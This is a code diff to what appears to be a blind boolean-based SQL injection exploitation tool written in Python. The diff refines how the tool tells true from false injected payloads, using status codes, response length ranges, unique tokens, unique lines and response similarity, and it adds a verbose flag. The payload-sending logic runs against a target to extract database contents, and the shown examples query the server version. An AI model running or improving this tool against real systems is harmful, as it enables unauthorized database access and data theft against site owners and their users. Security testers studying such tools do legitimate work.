@@ -57,7 +57,7 @@ EXAMPLES
       --query "SELECT version()"
 ----------------------------------------------------------------------
 """
-import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading, random
+import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading, random, difflib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 import urllib3
@@ -561,7 +561,14 @@ def _norm_tokens(text):
     # drop digit-only tokens so timestamps/counters don't poison token matching
     return {w for w in re.sub(r"\d+", "#", text).split() if len(w) >= 3}
 
+def _lines(txt):
+    return {ln.strip() for ln in txt.splitlines() if len(ln.strip()) >= 4}
+
+def _ratio(x, y):
+    return difflib.SequenceMatcher(None, x, y).quick_ratio()
+
 def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
+    vb = getattr(a, "verbose", False)
     # user-supplied matcher: still VERIFY it actually distinguishes true vs false in
     # THIS context (otherwise we'd "detect" an injection that isn't really there).
     if a.true_match or a.false_match:
@@ -571,23 +578,33 @@ def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
             clf, desc = (lambda r: a.false_match not in r.text), f"!text~'{a.false_match}'"
         rt = target.send(boolean_payload(ctx, cond_true, "-- -"))
         rf = target.send(boolean_payload(ctx, cond_false, "-- -"))
+        if vb:
+            print(f"    [v] {ctx.name} match-probe: true={clf(rt)} false={clf(rf)} "
+                  f"(status {rt.status}/{rf.status}, len {rt.length}/{rf.length})")
         return (clf, desc) if (clf(rt) and not clf(rf)) else None
+
     T = [target.send(boolean_payload(ctx, cond_true, "-- -")) for _ in range(3)]
     F = [target.send(boolean_payload(ctx, cond_false, "-- -")) for _ in range(3)]
+    if vb:
+        print(f"    [v] {ctx.name} status t={[r.status for r in T]} f={[r.status for r in F]}")
+        print(f"    [v] {ctx.name} length t={[r.length for r in T]} f={[r.length for r in F]}")
+
     # 1) status code
     st_t, st_f = {r.status for r in T}, {r.status for r in F}
     if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
         good = st_t.pop()
         return (lambda r, s=good: r.status == s), f"status=={good}"
-    # 2) body length
+
+    # 2) body length — by RANGE separation (robust to small jitter, no strict stability)
     lt, lf = [r.length for r in T], [r.length for r in F]
-    if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter):
-        ct, cf = sum(lt) / len(lt), sum(lf) / len(lf)
-        if abs(ct - cf) >= a.len_margin:
-            mid, hi_true = (ct + cf) / 2, ct > cf
-            return ((lambda r, m=mid, h=hi_true: (r.length > m) == h),
-                    f"len~{int(ct)}vs{int(cf)}")
-    # 3) digit-stripped token unique to TRUE (or FALSE)
+    if max(lf) + a.len_margin <= min(lt):
+        b = (max(lf) + min(lt)) / 2
+        return (lambda r, m=b: r.length > m), f"len>{int(b)}"
+    if max(lt) + a.len_margin <= min(lf):
+        b = (max(lt) + min(lf)) / 2
+        return (lambda r, m=b: r.length < m), f"len<{int(b)}"
+
+    # 3) digit-stripped TOKEN unique to TRUE (or FALSE)
     tt = [_norm_tokens(r.text) for r in T]
     tf = [_norm_tokens(r.text) for r in F]
     only_t = set.intersection(*tt) - set.union(*tf)
@@ -596,6 +613,23 @@ def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
     only_f = set.intersection(*tf) - set.union(*tt)
     for tok in sorted(only_f, key=len, reverse=True):
         return (lambda r, k=tok: k not in re.sub(r"\d+", "#", r.text)), f"!text~'{tok}'"
+
+    # 4) distinguishing LINE/phrase unique to TRUE (catches multi-word markers like
+    #    "Welcome back" when no single word is unique)
+    Lt = set.intersection(*[_lines(r.text) for r in T])
+    Lf = set().union(*[_lines(r.text) for r in F])
+    for ln in sorted(Lt - Lf, key=len, reverse=True):
+        if vb: print(f"    [v] line discriminator: {ln[:60]!r}")
+        return (lambda r, k=ln: k in r.text), f"line~'{ln[:25]}'"
+
+    # 5) last resort: response SIMILARITY (content differs but no clean substring)
+    reft, reff = T[0].text, F[0].text
+    self_t, cross = _ratio(reft, T[1].text), _ratio(reft, reff)
+    if vb: print(f"    [v] similarity self_t={self_t:.3f} cross={cross:.3f}")
+    if self_t >= 0.90 and self_t - cross >= 0.01:
+        return ((lambda r, a=reft, b=reff: _ratio(r.text, a) >= _ratio(r.text, b)),
+                f"similarity~{self_t:.2f}/{cross:.2f}")
+    if vb: print(f"    [v] {ctx.name}: no usable discriminator")
     return None
 
 
@@ -1100,6 +1134,7 @@ def main():
                      help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
     tun.add_argument("--proxy")
     tun.add_argument("--insecure", action="store_true", help="skip TLS verification (and silence its warning)")
+    tun.add_argument("-v", "--verbose", action="store_true", help="show detection internals (probe status/length, discriminator)")
 
     res = ap.add_argument_group("resume")
     res.add_argument("--state"); res.add_argument("--fresh", action="store_true")
